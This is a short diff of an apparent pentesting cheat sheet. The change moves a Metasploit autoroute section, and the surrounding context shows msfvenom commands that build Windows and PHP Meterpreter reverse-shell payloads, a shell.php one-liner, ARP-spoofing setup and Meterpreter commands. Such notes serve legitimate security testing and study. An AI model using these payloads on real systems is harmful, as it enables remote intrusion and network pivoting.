@@ -156,10 +156,6 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your 
 msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.php\
 cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
 ```
-## Metasploit Meterpreter autoroute
-```sh
-run autoroute -s 10.10.10.0/24
-```
 ## ARPSpoof
 ```sh
 echo 1 > /proc/sys/net/ipv4/ip_forward
@@ -206,7 +202,10 @@ show options                      #Check options and required value
 set <OpationName> value           #To configure an option
 exploit                           #Execution of exploitation
 ``` 
-
+## Metasploit Meterpreter autoroute
+```sh
+run autoroute -s 10.10.10.0/24
+```
 ## Meterpreter
 ```sh
 ps
